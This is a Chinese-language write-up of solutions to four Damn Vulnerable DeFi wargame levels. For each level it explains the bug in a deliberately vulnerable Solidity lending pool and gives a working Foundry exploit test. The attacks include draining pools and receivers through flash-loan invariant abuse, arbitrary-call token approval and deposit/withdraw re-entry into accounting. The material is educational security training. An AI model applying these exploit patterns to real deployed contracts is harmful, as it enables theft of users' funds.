# Damn Vulnerable Defi 解决方案
[Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/) 是由[@tinchoabbate](https://twitter.com/tinchoabbate)创建的学习DeFi智能合约安全攻击的战争游戏.


使用 [Foundry](https://github.com/foundry-rs/foundry)  完成.



# #1 - Unstoppable

合约:

- [DamnValuableToken](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/DamnValuableToken.sol)  Token 合约
-  [UnstoppableLender](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/unstoppable/UnstoppableLender.sol)   借贷池合约
- [ReceiverUnstoppable](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/unstoppable/ReceiverUnstoppable.sol) 调用借贷池的闪电贷合约



完成条件:

借贷池里有 100 万 个 DVT 代币,免费提供闪电贷,你初始拥有 100 个 DVT 代币,你需要攻击使借贷池合约 flashloan 失效.



解决方案:

UnstoppableLender 合约 **flashLoan** 函数 在 **transfer** 代币到调用的合约前, 函数中有 **assert** 检查条件 `poolBalance == balanceBefore`,如果我们通过调用借贷池合约 **depositTokens** 函数存入代币是会正常更新 **poolBalance**, 能通过 assert 条件检查的 

```solidity
uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
assert(poolBalance == balanceBefore);
```

而调用 `DVT Token` 合约 **transfer** 直接向借贷池合约发送代币, 不会更新 **poolBalance**,而 **flashLoan** 函数的 assert 检查  **poolBalance == balanceBefore** 无法通过, `ReceiverUnstoppable`合约调用借贷池合约 **flashLoan** 函数将不再正常工作.



使用 foundry 编写测试:

```solidity
    function testExploit() public {
        vm.startPrank(attacker);
        dvt.transfer(address(unstoppableLender), 100e18);
        vm.stopPrank();   
        verify();
    }
```



[Unstoppable.t.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/30349eba073206fe6b1c9acd26930468e543e064/src/test/Unstoppable.t.sol#L59-L64)

```
forge test --match-contract Unstoppable -vvvv
```

![Unstoppable](./testimage/Unstoppable.png)



# #2 - Naive receiver

合约:

- [NaiveReceiverLenderPool](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/naive-receiver/NaiveReceiverLenderPool.sol)  借贷池合约
- [FlashLoanReceiver](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/naive-receiver/FlashLoanReceiver.sol)   调用借贷池的闪电贷合约

完成条件:

有一个 `NaiveReceiverLenderPool` 借贷池合约提供了相当昂贵手续费的 ETH 闪电贷,余额为 1000 ETH,用户部署的 余额为 10 ETH 的 FlashLoanReceiver 合约与借贷池合约 **flashLoan** 函数交互接收 ETH.需要耗尽用户合约中的所有 ETH 资金.



解决方案:

 `NaiveReceiverLenderPool`合约 **flashLoan** 函数两个参数, borrower 为借款的合约的地址, borrowAmount 为借款的 ETH数.函数里 **functionCallWithValue**  发送借款 ETH 金额到借款的合约并调用借款合约的 `receiveEther` ,最后 **require** 检查借贷池的合约里余额得为借款前余额+ `FIXED_FEE` ,也就是说每笔闪电贷调用,用户合约需要支付 1 ETH  的手续费.

```solidity
uint256 private constant FIXED_FEE = 1 ether;

 function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {
	//...
        borrower.functionCallWithValue(
            abi.encodeWithSignature(
                "receiveEther(uint256)",
                FIXED_FEE
            ),
            borrowAmount
        );
        
        require(
            address(this).balance >= balanceBefore + FIXED_FEE,
            "Flash loan hasn't been paid back"
        );
    }
```


再看用户部署的 `FlashLoanReceiver` 合约,两个require,分别是检查调用者是否是借贷池合约,合约里的余额是否够完成闪电贷.

```solidity
    function receiveEther(uint256 fee) public payable {
        require(msg.sender == pool, "Sender must be pool");

        uint256 amountToBeRepaid = msg.value + fee;

        require(address(this).balance >= amountToBeRepaid, "Cannot borrow that much");
        
        _executeActionDuringFlashLoan();
        
        // Return funds to pool
        pool.sendValue(amountToBeRepaid);
    }
```

也就是说只要 `NaiveReceiverLenderPool`合约 **flashLoan** 函数,传入用户部署的 `FlashLoanReceiver` 地址, 此时 msg.sender 为借贷池合约,能通过 require 检查,而用户合约需要每笔多支付 1 ETH的手续费发送到借贷池合约,调用 10次就能耗尽用户合约中的所有 ETH.

使用 foundry 编写测试:

[NaiveReceiver.t.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/30349eba073206fe6b1c9acd26930468e543e064/src/test/NaiveReceiver.t.sol#L48-L55)

```solidity
    function testExploit() public {
        vm.startPrank(attacker);
        while (address(flashLoanReceiver).balance != 0){
            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver),1 ether);
        }
        vm.stopPrank();
        verify();
    }
```



```
forge test --match-contract NaiveReceiver -vvvv
```

![NaiveReceiver](./testimage/NaiveReceiver.png)



# #3 - Truster

合约:

- [DamnValuableToken](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/DamnValuableToken.sol)  Token 合约
- [TrusterLenderPool](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/truster/TrusterLenderPool.sol) 借贷池合约

完成条件:

`TrusterLenderPool`借贷池有 100 万个 DVT 代币提供免费闪电贷,而你一无所有,你需要通过一笔交易取出借贷池里的所有代币.

解决方案:

直接看 `TrusterLenderPool` 的 **flashLoan** 函数,参数 target,和 data 传入可以直接让 `TrusterLenderPool`合约去call()调用任意合约的任意函数(永远不要相信用户的输入), **flashLoan** 函数最后面 **require()** 是保证闪电贷结束的额度得和调用前不变,所以不能在在 **target.functionCall(data)** 调用 dvt 代币合约的 **transfer()** 直接将池里的代币发送给我们,而是先通过 **approve()** 将代币先授权给我们,等闪电贷结束后再调用 dvt 代币合约 **transfer()** 将所有代币发送给我们
```solidity
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
    {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        
        damnValuableToken.transfer(borrower, borrowAmount);
        target.functionCall(data);

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }
```



使用 foundry 编写测试:
[Truster.t.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/30349eba073206fe6b1c9acd26930468e543e064/src/test/Truster.t.sol#L35-L42)

```solidity
    function testExploit() public {
        vm.startPrank(attacker);
        bytes memory approve_func_sign = abi.encodeWithSelector(bytes4(keccak256("approve(address,uint256)")), address(attacker), type(uint256).max);
        trusterLenderPool.flashLoan(0, address(attacker), address(dvt), approve_func_sign);
        dvt.transferFrom(address(trusterLenderPool), address(attacker), TOKENS_IN_POOL);
        vm.stopPrank();
        verfiy();
    }
```



```
forge test --match-contract Truster -vvvv
```

![Truster](./testimage/Truster.png)



# #4 - Side entrance

合约:

[SideEntranceLenderPool](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/side-entrance/SideEntranceLenderPool.sol)  借贷池合约

完成条件: 

`SideEntranceLenderPool` 合约允许任何人存入 ETH ,并可以在任何时间提取出,借贷池中有 1000 ETH 并提供免费的闪电贷,你需要清空借贷池的 ETH.

解决方案:

```solidity
 function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");
        
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
    }
```



部署个合约调用 `SideEntranceLenderPool`借贷池的 **flashLoan() **函数借出池子里全部的 ETH,借贷池合约会接口调用我们部署的恶意合约的  **execute() **函数，在 **execut()** 函数里 **call()** 借贷池 **deposit()** 函数将闪电贷借出的 ETH 存入借贷池合约,使得能通过  **require** 金额检查,完成这笔闪电贷,再调用 **withdraw()** 取出 ETH,完成清空借贷池的 ETH.

使用 foundry 编写测试:

[SideEntrance.t.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/30349eba073206fe6b1c9acd26930468e543e064/src/test/SideEntrance.t.sol#L38-L69)

```solidity
    function testExploit() public {
        vm.startPrank(attacker);
        payload = new PayLoad(address(sideEntranceLenderPool));
        payload.start();
        vm.stopPrank();
        verfiy();
    }
    
contract PayLoad {
    IsideEntranceLenderPool public sideentrancelenderPool;
    constructor (address _target){
        sideentrancelenderPool = IsideEntranceLenderPool(_target);
    }

    function start() public {
        sideentrancelenderPool.flashLoan(1_000e18);
        sideentrancelenderPool.withdraw();
        selfdestruct(payable(msg.sender));
    }
        
    function execute() public payable {
       msg.sender.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
    }

    receive() external payable{}
}
```

```
forge test --match-contract SideEntrance -vvvv
```

![Truster](./testimage/side-entrance.png)
